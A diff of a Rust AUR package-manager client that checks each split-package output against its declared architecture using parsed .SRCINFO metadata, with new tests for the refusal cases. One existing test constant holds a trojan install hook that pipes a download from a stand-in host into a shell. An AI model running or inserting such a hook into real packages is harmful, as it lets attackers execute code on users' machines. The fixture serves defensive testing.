@@ -2821,12 +2821,31 @@ impl AurClient {
         Some(archives)
     }
 
-    fn archive_architecture_approved(srcinfo: &str, architecture: &str) -> bool {
-        super::utils::package_architecture_matches(std::env::consts::ARCH, architecture)
-            && srcinfo
-                .lines()
-                .filter_map(|line| line.split_once('='))
-                .any(|(key, value)| key.trim() == "arch" && value.trim() == architecture)
+    fn archive_architecture_approved(
+        srcinfo: &alpm_srcinfo::SourceInfoV1,
+        output: &str,
+        architecture: &str,
+    ) -> bool {
+        if !super::utils::package_architecture_matches(std::env::consts::ARCH, architecture) {
+            return false;
+        }
+        let Some(package) = srcinfo
+            .packages
+            .iter()
+            .find(|package| package.name.to_string() == output)
+        else {
+            return false;
+        };
+        let architectures = package
+            .architectures
+            .as_ref()
+            .unwrap_or(&srcinfo.base.architectures);
+        match architectures {
+            alpm_types::Architectures::Any => architecture == "any",
+            alpm_types::Architectures::Some(architectures) => architectures
+                .iter()
+                .any(|candidate| candidate.to_string() == architecture),
+        }
     }
 
     fn authorize_archives(
@@ -2853,6 +2872,7 @@ impl AurClient {
                 line.trim_start().starts_with("pkgver()")
                     || line.trim_start().starts_with("pkgver ()")
             });
+        let architecture_metadata = alpm_srcinfo::SourceInfoV1::from_string(srcinfo);
         paths
             .iter()
             .zip(outputs)
@@ -2879,7 +2899,9 @@ impl AurClient {
                     .as_deref()
                     .context("Archive lacks architecture")?;
                 anyhow::ensure!(
-                    Self::archive_architecture_approved(srcinfo, architecture),
+                    architecture_metadata.as_ref().is_ok_and(|metadata| {
+                        Self::archive_architecture_approved(metadata, output, architecture)
+                    }),
                     "AUR archive architecture is not approved for this host"
                 );
                 let declared = Self::srcinfo_install_script(srcinfo, output);
@@ -3136,10 +3158,15 @@ impl AurClient {
             return false;
         }
 
+        let architecture_metadata = alpm_srcinfo::SourceInfoV1::from_string(&srcinfo);
         if !identity
             .architecture
             .as_deref()
-            .is_some_and(|architecture| Self::archive_architecture_approved(&srcinfo, architecture))
+            .is_some_and(|architecture| {
+                architecture_metadata.as_ref().is_ok_and(|metadata| {
+                    Self::archive_architecture_approved(metadata, output, architecture)
+                })
+            })
         {
             tracing::warn!(
                 "Cached artifact provenance for {output}: architecture missing or not approved for this host; rejecting cache hit"
@@ -7584,6 +7611,178 @@ mod tests {
 
     const LEGIT_INSTALL: &str = "pre_install() {\n  echo legit\n}\n";
     const TROJAN_INSTALL: &str = "pre_install() {\n  curl evil.example/payload | sh\n}\n";
+
+    // Fixture-only code. The real archive reader and sealed output authorization
+    // must enforce each requested output's declared architecture independently.
+    fn assert_split_architecture_authorization(
+        srcinfo: &str,
+        requested: &[(&str, &str)],
+        accepted: bool,
+    ) -> Result<()> {
+        assert!(
+            !crate::core::is_root(),
+            "archive fixture must use an ordinary UID"
+        );
+        let audit_dir = tempfile::tempdir()?;
+        temp_env::with_var("OMG_DATA_DIR", Some(audit_dir.path()), || -> Result<()> {
+            let source_dir = tempfile::tempdir()?;
+            let archive_dir = tempfile::tempdir()?;
+            let pkgbuild = b"pkgbase=split\npkgname=(app docs)\npkgver=1.0\npkgrel=1\n";
+            std::fs::write(source_dir.path().join("PKGBUILD"), pkgbuild)?;
+            std::fs::write(source_dir.path().join(".SRCINFO"), srcinfo)?;
+            let mut paths = Vec::new();
+            for (name, architecture) in requested {
+                let archive = archive_dir
+                    .path()
+                    .join(format!("{name}-1.0-1-{architecture}.pkg.tar.gz"));
+                let pkginfo = format!(
+                    "pkgname = {name}\npkgbase = split\npkgver = 1.0-1\narch = {architecture}\n"
+                );
+                let buildinfo = format!(
+                    "format = 2\npkgname = {name}\npkgbase = split\npkgver = 1.0-1\npkgarch = {architecture}\n"
+                );
+                write_tar_gz(
+                    &archive,
+                    &[
+                        (".PKGINFO", pkginfo.as_bytes()),
+                        (".BUILDINFO", buildinfo.as_bytes()),
+                        (".MTREE", b"#mtree\n"),
+                    ],
+                );
+                paths.push(archive);
+            }
+            let archive_before = paths
+                .iter()
+                .map(std::fs::read)
+                .collect::<std::io::Result<Vec<_>>>()?;
+            let source = ReviewedSource::capture(source_dir.path())?;
+            let outputs = requested
+                .iter()
+                .map(|(name, _)| (*name).to_owned())
+                .collect::<Vec<_>>();
+            // This is the production final authorization boundary, before install.
+            let authorized =
+                AurClient::authorize_archives(&paths, &source, "split", &outputs, true);
+            if accepted {
+                let authorized = authorized?;
+                assert_eq!(authorized.len(), requested.len());
+                for (snapshot, (name, architecture)) in authorized.iter().zip(requested) {
+                    let identity =
+                        AurClient::cached_archive_identity(Path::new(&snapshot.handoff()))?
+                            .expect("sealed accepted archive must retain its actual metadata");
+                    assert_eq!(identity.name, *name);
+                    assert_eq!(identity.base, "split");
+                    assert_eq!(identity.version, "1.0-1");
+                    assert_eq!(identity.architecture.as_deref(), Some(*architecture));
+                }
+            } else {
+                let error =
+                    authorized.expect_err("wrong selected-output architecture must be refused");
+                assert_eq!(
+                    error.to_string(),
+                    "AUR archive architecture is not approved for this host"
+                );
+            }
+            // Retained legacy metadata check is cfg(test), not production reuse.
+            let cached = AurClient::select_cached_artifacts(
+                paths.clone(),
+                &outputs,
+                source_dir.path(),
+                "split",
+            );
+            if accepted {
+                assert_eq!(cached, Some(paths.clone()));
+            } else {
+                assert_eq!(cached, None);
+            }
+            assert_eq!(std::fs::read(source_dir.path().join("PKGBUILD"))?, pkgbuild);
+            assert_eq!(
+                std::fs::read(source_dir.path().join(".SRCINFO"))?,
+                srcinfo.as_bytes()
+            );
+            for (path, before) in paths.iter().zip(archive_before) {
+                assert_eq!(std::fs::read(path)?, before);
+            }
+            Ok(())
+        })
+    }
+
+    #[test]
+    fn split_output_architecture_rejects_sibling_any_for_host_output() -> Result<()> {
+        const TEST: &str = "package_managers::aur::client::tests::split_output_architecture_rejects_sibling_any_for_host_output";
+        if crate::core::testing::run_isolated_test(TEST)
+            || crate::config::Settings::rerun_test_unprivileged(TEST)
+        {
+            return Ok(());
+        }
+        let host = super::super::utils::current_arch()
+            .expect("supported Arch test host")
+            .to_string();
+        let srcinfo = format!(
+            "pkgbase = split\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = {host}\npkgname = app\npkgname = docs\n\tarch = any\n"
+        );
+        assert_split_architecture_authorization(&srcinfo, &[("app", &host)], true)?;
+        assert_split_architecture_authorization(&srcinfo, &[("app", "any")], false)
+    }
+
+    #[test]
+    fn split_output_architecture_rejects_base_host_for_any_override() -> Result<()> {
+        const TEST: &str = "package_managers::aur::client::tests::split_output_architecture_rejects_base_host_for_any_override";
+        if crate::core::testing::run_isolated_test(TEST)
+            || crate::config::Settings::rerun_test_unprivileged(TEST)
+        {
+            return Ok(());
+        }
+        let host = super::super::utils::current_arch()
+            .expect("supported Arch test host")
+            .to_string();
+        let srcinfo = format!(
+            "pkgbase = split\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = {host}\npkgname = app\npkgname = docs\n\tarch = any\n"
+        );
+        assert_split_architecture_authorization(&srcinfo, &[("docs", "any")], true)?;
+        assert_split_architecture_authorization(&srcinfo, &[("docs", &host)], false)
+    }
+
+    #[test]
+    fn split_output_architecture_rejects_base_any_for_host_override() -> Result<()> {
+        const TEST: &str = "package_managers::aur::client::tests::split_output_architecture_rejects_base_any_for_host_override";
+        if crate::core::testing::run_isolated_test(TEST)
+            || crate::config::Settings::rerun_test_unprivileged(TEST)
+        {
+            return Ok(());
+        }
+        let host = super::super::utils::current_arch()
+            .expect("supported Arch test host")
+            .to_string();
+        let srcinfo = format!(
+            "pkgbase = split\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = any\npkgname = app\n\tarch = {host}\npkgname = docs\n"
+        );
+        assert_split_architecture_authorization(&srcinfo, &[("docs", "any")], true)?;
+        assert_split_architecture_authorization(&srcinfo, &[("app", &host)], true)?;
+        assert_split_architecture_authorization(&srcinfo, &[("app", "any")], false)
+    }
+
+    #[test]
+    fn split_output_architecture_refuses_whole_pair_with_wrong_second_output() -> Result<()> {
+        const TEST: &str = "package_managers::aur::client::tests::split_output_architecture_refuses_whole_pair_with_wrong_second_output";
+        if crate::core::testing::run_isolated_test(TEST)
+            || crate::config::Settings::rerun_test_unprivileged(TEST)
+        {
+            return Ok(());
+        }
+        let host = super::super::utils::current_arch()
+            .expect("supported Arch test host")
+            .to_string();
+        let srcinfo = format!(
+            "pkgbase = split\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = {host}\npkgname = app\npkgname = docs\n\tarch = any\n"
+        );
+        assert_split_architecture_authorization(
+            &srcinfo,
+            &[("app", &host), ("docs", "any")],
+            true,
+        )?;
+        assert_split_architecture_authorization(&srcinfo, &[("app", &host), ("docs", &host)], false)
+    }
 
     #[test]
     fn cached_architecture_eligibility_matches_sealed_authorization() -> Result<()> {
